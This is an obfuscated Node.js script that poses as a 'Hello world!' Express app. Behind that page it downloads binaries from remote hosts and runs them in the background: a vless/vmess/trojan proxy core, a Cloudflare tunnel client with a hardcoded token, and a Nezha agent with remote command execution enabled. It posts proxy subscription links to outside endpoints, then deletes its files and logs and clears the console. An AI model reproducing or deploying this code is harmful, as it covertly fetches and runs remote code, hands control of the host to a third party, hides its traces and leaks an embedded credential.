const _0x3ef9e7=_0x2386;(function(_0x358ce3,_0x36e7e6){const _0x53eb2a=_0x2386,_0x5e47d5=_0x358ce3();while(!![]){try{const _0x37762d=parseInt(_0x53eb2a(0x1b7))/0x1*(parseInt(_0x53eb2a(0x207))/0x2)+parseInt(_0x53eb2a(0x1a5))/0x3*(parseInt(_0x53eb2a(0x1ec))/0x4)+-parseInt(_0x53eb2a(0x1dd))/0x5+parseInt(_0x53eb2a(0x1f2))/0x6*(parseInt(_0x53eb2a(0x1b0))/0x7)+-parseInt(_0x53eb2a(0x1bf))/0x8+parseInt(_0x53eb2a(0x173))/0x9+parseInt(_0x53eb2a(0x189))/0xa*(-parseInt(_0x53eb2a(0x1cb))/0xb);if(_0x37762d===_0x36e7e6)break;else _0x5e47d5['push'](_0x5e47d5['shift']());}catch(_0x3fc703){_0x5e47d5['push'](_0x5e47d5['shift']());}}}(_0xfdd0,0xe598c));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x3ef9e7(0x1c6)),{promisify}=require(_0x3ef9e7(0x179)),exec=promisify(require(_0x3ef9e7(0x1fe))[_0x3ef9e7(0x211)]),{execSync}=require(_0x3ef9e7(0x1fe)),UPLOAD_URL=process['env'][_0x3ef9e7(0x176)]||'',PROJECT_URL=process[_0x3ef9e7(0x194)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x3ef9e7(0x1d3)]||![],FILE_PATH=process['env'][_0x3ef9e7(0x1d4)]||_0x3ef9e7(0x1bb),SUB_PATH=process[_0x3ef9e7(0x194)][_0x3ef9e7(0x1f1)]||'sub',PORT=process['env'][_0x3ef9e7(0x1d7)]||process[_0x3ef9e7(0x194)][_0x3ef9e7(0x1ab)]||0xbb8,UUID=process[_0x3ef9e7(0x194)][_0x3ef9e7(0x1e8)]||_0x3ef9e7(0x16e),NEZHA_SERVER=process['env'][_0x3ef9e7(0x210)]||'',NEZHA_PORT=process[_0x3ef9e7(0x194)][_0x3ef9e7(0x1a4)]||'',NEZHA_KEY=process[_0x3ef9e7(0x194)][_0x3ef9e7(0x18c)]||'',ARGO_DOMAIN=process[_0x3ef9e7(0x194)][_0x3ef9e7(0x21f)]||'nodeserver.tyanxk.dpdns.org',ARGO_AUTH=process[_0x3ef9e7(0x194)]['ARGO_AUTH']||_0x3ef9e7(0x1fb),ARGO_PORT=process[_0x3ef9e7(0x194)][_0x3ef9e7(0x1f6)]||0x1f41,CFIP=process[_0x3ef9e7(0x194)]['CFIP']||'www.visa.com.sg',CFPORT=process[_0x3ef9e7(0x194)][_0x3ef9e7(0x1a0)]||0x1bb,NAME=process[_0x3ef9e7(0x194)][_0x3ef9e7(0x1eb)]||_0x3ef9e7(0x1ad);!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x3ef9e7(0x1a1)](FILE_PATH+_0x3ef9e7(0x167))):console[_0x3ef9e7(0x1a1)](FILE_PATH+_0x3ef9e7(0x165));let npmPath=path[_0x3ef9e7(0x204)](FILE_PATH,'npm'),phpPath=path[_0x3ef9e7(0x204)](FILE_PATH,'php'),webPath=path[_0x3ef9e7(0x204)](FILE_PATH,_0x3ef9e7(0x17f)),botPath=path[_0x3ef9e7(0x204)](FILE_PATH,_0x3ef9e7(0x1e9)),subPath=path[_0x3ef9e7(0x204)](FILE_PATH,_0x3ef9e7(0x17c)),listPath=path[_0x3ef9e7(0x204)](FILE_PATH,_0x3ef9e7(0x1cd)),bootLogPath=path[_0x3ef9e7(0x204)](FILE_PATH,_0x3ef9e7(0x1e7)),configPath=path[_0x3ef9e7(0x204)](FILE_PATH,'config.json');function deleteNodes(){const _0x53011c=_0x3ef9e7;try{if(!UPLOAD_URL)return;if(!fs[_0x53011c(0x18d)](subPath))return;let _0x2302dc;try{_0x2302dc=fs['readFileSync'](subPath,_0x53011c(0x170));}catch{return null;}const _0x59bae9=Buffer[_0x53011c(0x1d1)](_0x2302dc,_0x53011c(0x190))['toString'](_0x53011c(0x170)),_0x18bd26=_0x59bae9['split']('\x0a')[_0x53011c(0x1d9)](_0x5b35e7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x53011c(0x1de)](_0x5b35e7));if(_0x18bd26[_0x53011c(0x16a)]===0x0)return;return axios[_0x53011c(0x21c)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x53011c(0x220)]({'nodes':_0x18bd26}),{'headers':{'Content-Type':_0x53011c(0x21b)}})[_0x53011c(0x1b9)](_0x3a511b=>{return null;});}catch(_0x59bfd4){return null;}}function cleanupOldFiles(){const _0x18a77b=_0x3ef9e7,_0x53083d=[_0x18a77b(0x17f),_0x18a77b(0x1e9),'npm',_0x18a77b(0x1db),_0x18a77b(0x17c),'boot.log'];_0x53083d[_0x18a77b(0x1fa)](_0xee9317=>{const _0x1ed512=_0x18a77b,_0x5cdeb0=path[_0x1ed512(0x204)](FILE_PATH,_0xee9317);fs[_0x1ed512(0x214)](_0x5cdeb0,()=>{});});}app['get']('/',function(_0x29696a,_0x34dd59){const _0x572c43=_0x3ef9e7;_0x34dd59[_0x572c43(0x19b)](_0x572c43(0x213));});function _0xfdd0(){const _0x19d791=['https://amd64.ssss.nyc.mn/2go','message','10993570PHMxhC','amd','https://arm64.ssss.nyc.mn/v1','NEZHA_KEY','existsSync','/vmess-argo?ed=2560','127.0.0.1','base64','trim','aarch64','https+local://8.8.8.8/dns-query','env','?encryption=none&security=tls&sni=','&type=ws&host=','clear','npm\x20running\x20error:\x20','&path=%2Fvless-argo%3Fed%3D2560#','ArgoDomain:','send','./npm','push','https://amd64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/v1','CFPORT','log','quic','2053','NEZHA_PORT','42nynjrg','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','web\x20running\x20error:\x20','tunnel.yml','/sub.txt\x20saved\x20successfully','xtls-rprx-vision','PORT','false','Vls','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','arm','7twpHWe','rm\x20-rf\x20','/php\x20-c\x20\x22','writeFileSync','response','https://arm64.ssss.nyc.mn/2go','Empowerment\x20failed\x20for\x20','245yFCPXK','/config.json\x20>/dev/null\x202>&1\x20&','catch','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','./tmp','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','toString','添加URL失败:\x20','9776856pMIVEf','\x20successfully','Subscription\x20uploaded\x20successfully','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','includes','split','fileName','path','map','&path=%2Ftrojan-argo%3Fed%3D2560#','match','blackhole','22mjBBaA','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','list.txt','/dev/null','finish','\x0a\x20\x20\x20\x20','from','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','AUTO_ACCESS','FILE_PATH','\x20failed:\x20','\x0avless://','SERVER_PORT','\x0a\x20\x20credentials-file:\x20','filter','npm','php','data','3437010dDqWHA','test','arch','error','automatic\x20access\x20task\x20added\x20successfully','all','web\x20is\x20running','/vless-argo','none','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','boot.log','UUID','bot','ARGO_DOMAIN:','NAME','351596TPRpmm','TunnelSecret','vmess','2087','bot\x20is\x20running','SUB_PATH','4459890xTeewM','NEZHA\x20variable\x20is\x20empty,skip\x20running','http','nohup\x20','ARGO_PORT','tls','pop','vless','forEach','eyJhIjoiNjcyZWQ5M2M0OTY4MDgyNGQ0MzQzMzQ4YWYzYjU2N2EiLCJ0IjoiNmQ1ODE0YzAtZTNjYy00OTQ2LTg5MzktMWFjMTgwN2RhN2I1IiwicyI6Ik4yVmpOemczT1RRdE1tRTVZaTAwTm1NMExXRm1Zemt0TW1ReU56RTNNVGxsTXpoayJ9','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','2083','child_process','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','php\x20is\x20running','/api/add-nodes','Content-Type','npm\x20is\x20running','join','status','chmod','11086ePgIXT','config.yaml','/api/add-subscriptions','set','2096','/bot\x20','\x20-p\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','NEZHA_SERVER','exec','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Hello\x20world!','unlink','true','\x0aclient_secret:\x20','\x20>/dev/null\x202>&1\x20&','/trojan-argo','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','http\x20server\x20is\x20running\x20on\x20port:','application/json','post','\x0a\x20\x20tunnel:\x20','https://oooo.serv00.net/add-url','ARGO_DOMAIN','stringify','./php','createWriteStream','listen','./web','\x20already\x20exists','stream','\x20is\x20created','./bot','trojan','length','readFileSync','tunnel.json','443','9afd1229-b893-40c1-84dd-51e7ce204913','get','utf-8','pipe','\x20>/dev/null\x202>&1','15450435hsKwCz','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x0atrojan://','UPLOAD_URL','text/plain;\x20charset=utf-8','tcp','util','Download\x20','https://arm64.ssss.nyc.mn/agent','sub.txt','App\x20is\x20running','?security=tls&sni=','web','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Error\x20reading\x20boot.log:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','unshift','\x0a\x20\x20\x0avmess://','/vmess-argo','/web\x20-c\x20'];_0xfdd0=function(){return _0x19d791;};return _0xfdd0();}const config={'log':{'access':'/dev/null','error':_0x3ef9e7(0x1ce),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3ef9e7(0x1f9),'settings':{'clients':[{'id':UUID,'flow':_0x3ef9e7(0x1aa)}],'decryption':_0x3ef9e7(0x1e5),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x3ef9e7(0x185),'dest':0xbbb},{'path':_0x3ef9e7(0x218),'dest':0xbbc}]},'streamSettings':{'network':_0x3ef9e7(0x178)}},{'port':0xbb9,'listen':_0x3ef9e7(0x18f),'protocol':_0x3ef9e7(0x1f9),'settings':{'clients':[{'id':UUID}],'decryption':_0x3ef9e7(0x1e5)},'streamSettings':{'network':_0x3ef9e7(0x178),'security':_0x3ef9e7(0x1e5)}},{'port':0xbba,'listen':_0x3ef9e7(0x18f),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3ef9e7(0x1e5)},'streamSettings':{'network':'ws','security':_0x3ef9e7(0x1e5),'wsSettings':{'path':_0x3ef9e7(0x1e4)}},'sniffing':{'enabled':!![],'destOverride':[_0x3ef9e7(0x1f4),_0x3ef9e7(0x1f7),_0x3ef9e7(0x1a2)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3ef9e7(0x18f),'protocol':_0x3ef9e7(0x1ee),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3ef9e7(0x185)}},'sniffing':{'enabled':!![],'destOverride':[_0x3ef9e7(0x1f4),_0x3ef9e7(0x1f7),_0x3ef9e7(0x1a2)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3ef9e7(0x18f),'protocol':_0x3ef9e7(0x169),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3ef9e7(0x1e5),'wsSettings':{'path':_0x3ef9e7(0x218)}},'sniffing':{'enabled':!![],'destOverride':[_0x3ef9e7(0x1f4),_0x3ef9e7(0x1f7),_0x3ef9e7(0x1a2)],'metadataOnly':![]}}],'dns':{'servers':[_0x3ef9e7(0x193)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x3ef9e7(0x1ca),'tag':'block'}]};fs['writeFileSync'](path[_0x3ef9e7(0x204)](FILE_PATH,'config.json'),JSON[_0x3ef9e7(0x220)](config,null,0x2));function getSystemArchitecture(){const _0x3b4218=_0x3ef9e7,_0x5533aa=os[_0x3b4218(0x1df)]();return _0x5533aa===_0x3b4218(0x1af)||_0x5533aa==='arm64'||_0x5533aa===_0x3b4218(0x192)?_0x3b4218(0x1af):_0x3b4218(0x18a);}function downloadFile(_0x1588ec,_0x437ad3,_0xbae61b){const _0x17efc5=_0x3ef9e7,_0x15682d=path[_0x17efc5(0x204)](FILE_PATH,_0x1588ec),_0x3ef854=fs[_0x17efc5(0x222)](_0x15682d);axios({'method':_0x17efc5(0x16f),'url':_0x437ad3,'responseType':_0x17efc5(0x166)})['then'](_0x112cbb=>{const _0x519a15=_0x17efc5;_0x112cbb[_0x519a15(0x1dc)][_0x519a15(0x171)](_0x3ef854),_0x3ef854['on'](_0x519a15(0x1cf),()=>{const _0x515c43=_0x519a15;_0x3ef854['close'](),console[_0x515c43(0x1a1)](_0x515c43(0x17a)+_0x1588ec+_0x515c43(0x1c0)),_0xbae61b(null,_0x1588ec);}),_0x3ef854['on'](_0x519a15(0x1e0),_0x477ebf=>{const _0x4c3128=_0x519a15;fs['unlink'](_0x15682d,()=>{});const _0x11446e=_0x4c3128(0x17a)+_0x1588ec+'\x20failed:\x20'+_0x477ebf[_0x4c3128(0x188)];console['error'](_0x11446e),_0xbae61b(_0x11446e);});})[_0x17efc5(0x1b9)](_0x1a6848=>{const _0x1daf03=_0x17efc5,_0x270232=_0x1daf03(0x17a)+_0x1588ec+_0x1daf03(0x1d5)+_0x1a6848['message'];console[_0x1daf03(0x1e0)](_0x270232),_0xbae61b(_0x270232);});}function _0x2386(_0xf1fe46,_0x2ccb1e){const _0xfdd0d8=_0xfdd0();return _0x2386=function(_0x2386bf,_0x4b8f61){_0x2386bf=_0x2386bf-0x165;let _0xf347e0=_0xfdd0d8[_0x2386bf];return _0xf347e0;},_0x2386(_0xf1fe46,_0x2ccb1e);}async function downloadFilesAndRun(){const _0x53018b=_0x3ef9e7,_0x11047c=getSystemArchitecture(),_0x4fcd15=getFilesForArchitecture(_0x11047c);if(_0x4fcd15[_0x53018b(0x16a)]===0x0){console[_0x53018b(0x1a1)](_0x53018b(0x1fc));return;}const _0xe6fcbf=_0x4fcd15[_0x53018b(0x1c7)](_0x2556be=>{return new Promise((_0x3a843c,_0x3696ba)=>{const _0x18dcdf=_0x2386;downloadFile(_0x2556be[_0x18dcdf(0x1c5)],_0x2556be['fileUrl'],(_0x7d315,_0xa894cc)=>{_0x7d315?_0x3696ba(_0x7d315):_0x3a843c(_0xa894cc);});});});try{await Promise[_0x53018b(0x1e2)](_0xe6fcbf);}catch(_0x8586af){console[_0x53018b(0x1e0)]('Error\x20downloading\x20files:',_0x8586af);return;}function _0x2d41cc(_0x35fac1){const _0x3e328e=_0x53018b,_0x588080=0x1fd;_0x35fac1[_0x3e328e(0x1fa)](_0xc8e135=>{const _0x32a0dc=_0x3e328e,_0x265275=path[_0x32a0dc(0x204)](FILE_PATH,_0xc8e135);fs['existsSync'](_0x265275)&&fs[_0x32a0dc(0x206)](_0x265275,_0x588080,_0x1381d5=>{const _0x1fa8ab=_0x32a0dc;_0x1381d5?console[_0x1fa8ab(0x1e0)](_0x1fa8ab(0x1b6)+_0x265275+':\x20'+_0x1381d5):console['log']('Empowerment\x20success\x20for\x20'+_0x265275+':\x20'+_0x588080['toString'](0x8));});});}const _0x34ae3b=NEZHA_PORT?[_0x53018b(0x19c),_0x53018b(0x224),'./bot']:[_0x53018b(0x221),_0x53018b(0x224),_0x53018b(0x168)];_0x2d41cc(_0x34ae3b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5cc755=NEZHA_SERVER[_0x53018b(0x1c3)](':')?NEZHA_SERVER[_0x53018b(0x1c4)](':')[_0x53018b(0x1f8)]():'',_0x3da554=new Set([_0x53018b(0x16d),'8443',_0x53018b(0x20b),_0x53018b(0x1ef),_0x53018b(0x1fd),'2053']),_0x449df8=_0x3da554['has'](_0x5cc755)?_0x53018b(0x215):_0x53018b(0x1ac),_0x122a9a=_0x53018b(0x216)+NEZHA_KEY+_0x53018b(0x1d2)+NEZHA_SERVER+_0x53018b(0x1e6)+_0x449df8+_0x53018b(0x180)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x53018b(0x208)),_0x122a9a);const _0x7131c8='nohup\x20'+FILE_PATH+_0x53018b(0x1b2)+FILE_PATH+_0x53018b(0x174);try{await exec(_0x7131c8),console['log'](_0x53018b(0x200)),await new Promise(_0x52c82a=>setTimeout(_0x52c82a,0x3e8));}catch(_0x26465b){console['error']('php\x20running\x20error:\x20'+_0x26465b);}}else{let _0xc082a0='';const _0x221631=[_0x53018b(0x16d),'8443',_0x53018b(0x20b),_0x53018b(0x1ef),_0x53018b(0x1fd),_0x53018b(0x1a3)];_0x221631['includes'](NEZHA_PORT)&&(_0xc082a0='--tls');const _0x387ee4='nohup\x20'+FILE_PATH+'/npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x53018b(0x20d)+NEZHA_KEY+'\x20'+_0xc082a0+_0x53018b(0x217);try{await exec(_0x387ee4),console[_0x53018b(0x1a1)](_0x53018b(0x203)),await new Promise(_0x28a49c=>setTimeout(_0x28a49c,0x3e8));}catch(_0x13edf4){console[_0x53018b(0x1e0)](_0x53018b(0x198)+_0x13edf4);}}}else console[_0x53018b(0x1a1)](_0x53018b(0x1f3));const _0x4b46f0=_0x53018b(0x1f5)+FILE_PATH+_0x53018b(0x186)+FILE_PATH+_0x53018b(0x1b8);try{await exec(_0x4b46f0),console['log'](_0x53018b(0x1e3)),await new Promise(_0x2caf5a=>setTimeout(_0x2caf5a,0x3e8));}catch(_0x27338c){console[_0x53018b(0x1e0)](_0x53018b(0x1a7)+_0x27338c);}if(fs[_0x53018b(0x18d)](path[_0x53018b(0x204)](FILE_PATH,_0x53018b(0x1e9)))){let _0x2f53cb;if(ARGO_AUTH[_0x53018b(0x1c9)](/^[A-Z0-9a-z=]{120,250}$/))_0x2f53cb=_0x53018b(0x212)+ARGO_AUTH;else ARGO_AUTH[_0x53018b(0x1c9)](/TunnelSecret/)?_0x2f53cb=_0x53018b(0x1ae)+FILE_PATH+'/tunnel.yml\x20run':_0x2f53cb=_0x53018b(0x1ff)+FILE_PATH+_0x53018b(0x219)+ARGO_PORT;try{await exec(_0x53018b(0x1f5)+FILE_PATH+_0x53018b(0x20c)+_0x2f53cb+'\x20>/dev/null\x202>&1\x20&'),console[_0x53018b(0x1a1)](_0x53018b(0x1f0)),await new Promise(_0x4bc7db=>setTimeout(_0x4bc7db,0x7d0));}catch(_0x5bcc85){console['error']('Error\x20executing\x20command:\x20'+_0x5bcc85);}}await new Promise(_0x5193db=>setTimeout(_0x5193db,0x1388));}function getFilesForArchitecture(_0x3e92e6){const _0x5d0211=_0x3ef9e7;let _0x2aa008;_0x3e92e6===_0x5d0211(0x1af)?_0x2aa008=[{'fileName':_0x5d0211(0x17f),'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':'bot','fileUrl':_0x5d0211(0x1b5)}]:_0x2aa008=[{'fileName':'web','fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':_0x5d0211(0x1e9),'fileUrl':_0x5d0211(0x187)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5b7288=_0x3e92e6===_0x5d0211(0x1af)?_0x5d0211(0x17b):_0x5d0211(0x19e);_0x2aa008[_0x5d0211(0x183)]({'fileName':_0x5d0211(0x1da),'fileUrl':_0x5b7288});}else{const _0x47b05e=_0x3e92e6===_0x5d0211(0x1af)?_0x5d0211(0x18b):_0x5d0211(0x19f);_0x2aa008[_0x5d0211(0x183)]({'fileName':'php','fileUrl':_0x47b05e});}}return _0x2aa008;}function argoType(){const _0x4bc1c5=_0x3ef9e7;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x4bc1c5(0x20e));return;}if(ARGO_AUTH[_0x4bc1c5(0x1c3)](_0x4bc1c5(0x1ed))){fs[_0x4bc1c5(0x1b3)](path[_0x4bc1c5(0x204)](FILE_PATH,_0x4bc1c5(0x16c)),ARGO_AUTH);const _0x34d05b=_0x4bc1c5(0x21d)+ARGO_AUTH[_0x4bc1c5(0x1c4)]('\x22')[0xb]+_0x4bc1c5(0x1d8)+path[_0x4bc1c5(0x204)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x4bc1c5(0x1ba)+ARGO_PORT+_0x4bc1c5(0x1c2);fs[_0x4bc1c5(0x1b3)](path[_0x4bc1c5(0x204)](FILE_PATH,_0x4bc1c5(0x1a8)),_0x34d05b);}else console[_0x4bc1c5(0x1a1)](_0x4bc1c5(0x20f));}argoType();async function extractDomains(){const _0x26a90c=_0x3ef9e7;let _0x49dfb8;if(ARGO_AUTH&&ARGO_DOMAIN)_0x49dfb8=ARGO_DOMAIN,console[_0x26a90c(0x1a1)](_0x26a90c(0x1ea),_0x49dfb8),await _0x45134d(_0x49dfb8);else try{const _0x1926b0=fs[_0x26a90c(0x16b)](path[_0x26a90c(0x204)](FILE_PATH,_0x26a90c(0x1e7)),_0x26a90c(0x170)),_0x299a96=_0x1926b0[_0x26a90c(0x1c4)]('\x0a'),_0x13b148=[];_0x299a96[_0x26a90c(0x1fa)](_0x357ca8=>{const _0x4100c6=_0x26a90c,_0x545ddb=_0x357ca8[_0x4100c6(0x1c9)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x545ddb){const _0x4ab768=_0x545ddb[0x1];_0x13b148[_0x4100c6(0x19d)](_0x4ab768);}});if(_0x13b148['length']>0x0)_0x49dfb8=_0x13b148[0x0],console['log'](_0x26a90c(0x19a),_0x49dfb8),await _0x45134d(_0x49dfb8);else{console[_0x26a90c(0x1a1)](_0x26a90c(0x182)),fs['unlinkSync'](path[_0x26a90c(0x204)](FILE_PATH,_0x26a90c(0x1e7)));async function _0x29580e(){const _0x1cf49a=_0x26a90c;try{await exec(_0x1cf49a(0x1cc));}catch(_0x4778ea){}}_0x29580e(),await new Promise(_0x4a7acc=>setTimeout(_0x4a7acc,0xbb8));const _0x3a03fa='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x26a90c(0x219)+ARGO_PORT;try{await exec(_0x26a90c(0x1f5)+path[_0x26a90c(0x204)](FILE_PATH,_0x26a90c(0x1e9))+'\x20'+_0x3a03fa+_0x26a90c(0x217)),console[_0x26a90c(0x1a1)]('bot\x20is\x20running.'),await new Promise(_0x292c29=>setTimeout(_0x292c29,0xbb8)),await extractDomains();}catch(_0x5cb161){console['error']('Error\x20executing\x20command:\x20'+_0x5cb161);}}}catch(_0x4be8b5){console[_0x26a90c(0x1e0)](_0x26a90c(0x181),_0x4be8b5);}async function _0x45134d(_0x5b1ac6){const _0x5a2a8d=_0x26a90c,_0x54ee11=execSync(_0x5a2a8d(0x1bc),{'encoding':_0x5a2a8d(0x170)}),_0x3f155d=_0x54ee11[_0x5a2a8d(0x191)]();return new Promise(_0x35ba6b=>{setTimeout(()=>{const _0x163e24=_0x2386,_0x3b64bc={'v':'2','ps':NAME+'-'+_0x3f155d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x163e24(0x1e5),'host':_0x5b1ac6,'path':_0x163e24(0x18e),'tls':_0x163e24(0x1f7),'sni':_0x5b1ac6,'alpn':''},_0x2985d1=_0x163e24(0x1d6)+UUID+'@'+CFIP+':'+CFPORT+_0x163e24(0x195)+_0x5b1ac6+_0x163e24(0x196)+_0x5b1ac6+_0x163e24(0x199)+NAME+'-'+_0x3f155d+_0x163e24(0x184)+Buffer[_0x163e24(0x1d1)](JSON[_0x163e24(0x220)](_0x3b64bc))[_0x163e24(0x1bd)](_0x163e24(0x190))+_0x163e24(0x175)+UUID+'@'+CFIP+':'+CFPORT+_0x163e24(0x17e)+_0x5b1ac6+_0x163e24(0x196)+_0x5b1ac6+_0x163e24(0x1c8)+NAME+'-'+_0x3f155d+_0x163e24(0x1d0);console['log'](Buffer[_0x163e24(0x1d1)](_0x2985d1)['toString']('base64')),fs[_0x163e24(0x1b3)](subPath,Buffer[_0x163e24(0x1d1)](_0x2985d1)[_0x163e24(0x1bd)](_0x163e24(0x190))),console[_0x163e24(0x1a1)](FILE_PATH+_0x163e24(0x1a9)),uplodNodes(),app[_0x163e24(0x16f)]('/'+SUB_PATH,(_0x1fa3b3,_0x4d1753)=>{const _0x1d21e0=_0x163e24,_0x4b1c16=Buffer[_0x1d21e0(0x1d1)](_0x2985d1)[_0x1d21e0(0x1bd)](_0x1d21e0(0x190));_0x4d1753[_0x1d21e0(0x20a)](_0x1d21e0(0x202),_0x1d21e0(0x177)),_0x4d1753['send'](_0x4b1c16);}),_0x35ba6b(_0x2985d1);},0x7d0);});}}async function uplodNodes(){const _0x24d0af=_0x3ef9e7;if(UPLOAD_URL&&PROJECT_URL){const _0x42ef1d=PROJECT_URL+'/'+SUB_PATH,_0x39e95b={'subscription':[_0x42ef1d]};try{const _0x587d25=await axios[_0x24d0af(0x21c)](UPLOAD_URL+_0x24d0af(0x209),_0x39e95b,{'headers':{'Content-Type':_0x24d0af(0x21b)}});if(_0x587d25[_0x24d0af(0x205)]===0xc8)console[_0x24d0af(0x1a1)](_0x24d0af(0x1c1));else return null;}catch(_0x4013e8){if(_0x4013e8[_0x24d0af(0x1b4)]){if(_0x4013e8[_0x24d0af(0x1b4)][_0x24d0af(0x205)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x24d0af(0x18d)](listPath))return;const _0x5dba19=fs[_0x24d0af(0x16b)](listPath,'utf-8'),_0x531c0a=_0x5dba19[_0x24d0af(0x1c4)]('\x0a')['filter'](_0x457683=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x457683));if(_0x531c0a['length']===0x0)return;const _0x43c6c9=JSON[_0x24d0af(0x220)]({'nodes':_0x531c0a});try{await axios[_0x24d0af(0x21c)](UPLOAD_URL+_0x24d0af(0x201),_0x43c6c9,{'headers':{'Content-Type':_0x24d0af(0x21b)}});if(response[_0x24d0af(0x205)]===0xc8)console[_0x24d0af(0x1a1)](_0x24d0af(0x1c1));else return null;}catch(_0x231d1f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x47d9ee=_0x2386,_0xc42caf=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0xc42caf[_0x47d9ee(0x19d)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xc42caf[_0x47d9ee(0x19d)](phpPath);exec(_0x47d9ee(0x1b1)+_0xc42caf[_0x47d9ee(0x204)]('\x20')+_0x47d9ee(0x172),_0x40ac51=>{const _0x27c1ef=_0x47d9ee;console[_0x27c1ef(0x197)](),console[_0x27c1ef(0x1a1)](_0x27c1ef(0x17d)),console[_0x27c1ef(0x1a1)](_0x27c1ef(0x1a6));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x445ba4=_0x3ef9e7;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x445ba4(0x1a1)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x2b210d=await axios[_0x445ba4(0x21c)](_0x445ba4(0x21e),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console[_0x445ba4(0x1a1)](_0x445ba4(0x1e1));}catch(_0x36c465){console[_0x445ba4(0x1e0)](_0x445ba4(0x1be)+_0x36c465['message']);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x3ef9e7(0x223)](PORT,()=>console['log'](_0x3ef9e7(0x21a)+PORT+'!'));
